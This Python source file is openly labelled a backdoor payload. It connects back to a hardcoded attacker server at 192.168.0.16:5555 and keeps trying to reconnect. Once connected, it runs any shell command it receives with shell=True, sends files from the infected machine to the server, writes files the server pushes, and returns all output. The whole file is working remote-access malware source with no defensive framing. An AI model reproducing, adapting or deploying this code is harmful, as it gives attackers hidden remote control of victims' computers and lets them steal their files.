"""
BACKDOOR PAYLOAD
----------------

written by: mr3w00d - 2022

Opens a connection to the backdoor server and recive requests througt an encoded RequestData object.

There are two kinds of requests
- shell request : executed in the shell
- application request : exectuted in the application

Replies with transfering a ResponseData object as an encoded json string

Note that all requests requres a response

"""

from modules.RequestData import RequestData
from modules.ResponseData import ResponseData
import socket,subprocess, time, os


# Default reciver ip address and port
RECIVER_IP      = "192.168.0.16"
RECIVER_PORT    = 5555

# default timer for trying to reconnect with host, default: 20 seconds
DEFAULT_TIMEOUT = 0.5   # DEV :: set as half second for dev purposes
# debug mode for application
DEBUG           = True


def log_debug(text):
    """ logs debug text if needed"""
    if not DEBUG:
        return
    print("DEBUG :: {}".format(text))


def breakpoint(value, text=None):

    if not text:
        text = "DEV :: Checking value"

    print("DEV :: {}\n{}".format(text, value))
    input("DEV :: Press enter to continue...")


class Backdoor:
    """
    Backdoor Class

    Use Run method to run an instance of the backdoor class

    @param ip (string) : backdoor server ip
    @param port (int) : backdoor server port
    """

    def __init__(self, ip, port):
        self.__address = (ip, port)
        self.__cwd = os.getcwd()
        self.__socket = None

    
    def run(self):
        """ establish connection and recive data transmitted from the backdoor server"""

        while True:
            time.sleep(DEFAULT_TIMEOUT)

            try:
                self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.__socket.connect(self.__address)

                log_debug("Connected")

                self.__shell()

                log_debug("Disconnected")
            
            except ConnectionRefusedError:
                log_debug("No Connection...")
                continue

            except ConnectionResetError:
                log_debug("Connection Lost...")

    
    def __shell(self):
        """ handles incomming requests """

        while True:

            req = self.__recive()
            cmd = req.command

            if req.type == "app":

                # handle exit
                if cmd == "exit":
                    break

                # handle dir change
                if cmd[:2] == "cd":
                    self.__set_cwd(cmd)
                    continue

                # handle get cwd
                if cmd == "getcwd":
                    res = ResponseData(cwd=self.__cwd)
                    self.__send(res)
                    continue

                # handle load to server (server download command)
                if cmd[:8] == "download":
                    file_name = cmd[9:]
                    self.__upload_file(file_name)
                    continue

                # handle load from server (server upload command)
                if cmd[:6] == "upload":
                    file_name = cmd[7:]
                    self.__download_file(file_name)
                    continue

            # handle shell event
            self.__process(cmd)


    def __send(self, data):
        """ 
        Encode and send data 
        
        @param data (Response) : Response object for data transfer
        """

        encData = data.encode_data()
        self.__socket.send(encData)


    def __recive(self) -> RequestData:
        """ Recives request data from server"""

        data = ""
        while True:
            try: 
                data += self.__socket.recv(1024).decode().rstrip()
                req = RequestData()
                req.parse_json(data)
                return req
            except ValueError:
                continue


    def __set_cwd(self, cmd):
        """
        Change current working directory from command and send response.
        Send error message if could not change cwd

        @param cmd: shell command for change directory (cd)
        """
        res = ResponseData()

        try:
            path = cmd.split(" ")[1]
            os.chdir(path)
            self.__cwd = os.getcwd()
            res.cwd = self.__cwd
        except Exception as e:
            res.err = f"Could not change directory\n {e}"

        self.__send(res)
    

    def __download_file(self, file_name):
        """ 
        Upload selected file from directory to backdoor server.
        
        @ param command (string) : download command
        """

        with open(file_name, "wb") as file:
            self.__socket.settimeout(1)
            chunk = self.__socket.recv(1024)
            while chunk:
                file.write(chunk)
                try:
                    chunk = self.__socket.recv(1024)
                except socket.timeout:
                    break
            self.__socket.settimeout(None)


    def __upload_file(self, file_name):
        """
        Recive file from server
        
        @param file_name string) : name of file
        """

        file_exist = os.path.exists(file_name)

        res = ResponseData()

        if file_exist:
            res.out = "exist"
            self.__send(res)
            with open(file_name, "rb") as file:
                self.__socket.send(file.read())
        else:
            self.__send(res)


    def __process(self, command):
        """
        Process shell commands on target.
        Sends response data to server.

        @param command (string) shell command
        """

        process = subprocess.Popen(
            command,
            shell=True,
            text=True,
            cwd=self.__cwd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        out, err = process.communicate()

        res = ResponseData(out, err)

        self.__send(res)



if __name__ == "__main__":

    bd = Backdoor(RECIVER_IP, RECIVER_PORT)
    bd.run()